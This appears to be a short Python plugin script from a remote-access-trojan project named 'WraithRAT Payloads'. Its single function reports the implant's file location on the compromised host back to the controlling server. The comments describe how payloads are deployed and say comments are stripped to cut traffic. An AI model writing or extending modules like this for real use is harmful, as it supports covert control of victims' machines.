# Part of the WraithRAT Payloads repository
# Each payload must be placed in the server/assets/wraith-scripts directory
# Note: Comments should be removed so less data needs to be sent to the wraith

def script_main(wraith, cmdline):
    try:
        wraith.putresult("SUCCESS", "File location: `{}`".format(os.path.abspath(sys.argv[0])))
    except Exception as e:
        wraith.putresult("ERROR", "Could not find file location ({}).".format(e))
